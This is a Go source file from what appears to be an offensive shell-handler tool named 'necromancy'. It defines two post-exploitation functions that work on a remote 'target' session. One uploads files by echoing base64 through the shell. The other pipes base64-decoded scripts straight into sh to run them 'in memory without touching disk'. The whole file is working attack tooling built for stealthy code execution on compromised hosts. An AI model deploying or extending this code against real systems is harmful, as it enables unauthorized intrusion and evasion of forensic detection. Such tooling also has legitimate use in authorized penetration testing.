package modules

import (
	"encoding/base64"
	"fmt"
	"os"

	"github.com/Aryma-f4/necromancy/core"
)

// UploadFile uploads a local file to the remote target by reading it,
// base64 encoding it, and echoing it to a file on the target.
func UploadFile(s *core.Session, localPath, remotePath string) error {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %v", err)
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	
	// Send the payload via bash echo and base64 decode
	cmd := fmt.Sprintf("echo '%s' | base64 -d > %s\n", encoded, remotePath)
	_, err = s.Write([]byte(cmd))
	if err != nil {
		return fmt.Errorf("failed to write to session: %v", err)
	}
	
	fmt.Printf("[+] Successfully uploaded %s to %s\n", localPath, remotePath)
	return nil
}

// ExecuteInMemory reads a local script, encodes it to base64, and sends it
// to the target to be decoded and executed directly in memory without touching disk.
func ExecuteInMemory(s *core.Session, localPath string) error {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %v", err)
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	
	// Send the payload via bash echo and base64 decode directly to sh
	cmd := fmt.Sprintf("echo '%s' | base64 -d | sh\n", encoded)
	_, err = s.Write([]byte(cmd))
	if err != nil {
		return fmt.Errorf("failed to write to session: %v", err)
	}
	
	fmt.Printf("[+] Successfully executed %s in memory on the remote target\n", localPath)
	return nil
}
